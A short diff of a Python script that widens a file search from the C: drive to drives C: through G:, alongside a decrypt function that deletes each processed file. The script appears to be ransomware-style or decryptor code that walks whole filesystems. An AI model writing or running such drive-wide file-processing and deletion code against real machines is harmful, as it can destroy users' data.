@@ -1,4 +1,6 @@
-import os, fnmatch
+import os
+import fnmatch
+
 
 
 def search_file(dirname):
@@ -29,4 +31,6 @@ def decrypt(file):
     os.remove(file)
 
 
-search_file("C:/")
+rootdir_ = ['C:/', 'D:/', 'E:/', 'F:/', 'G:/']
+for _root in rootdir_:
+    search_file(_root)
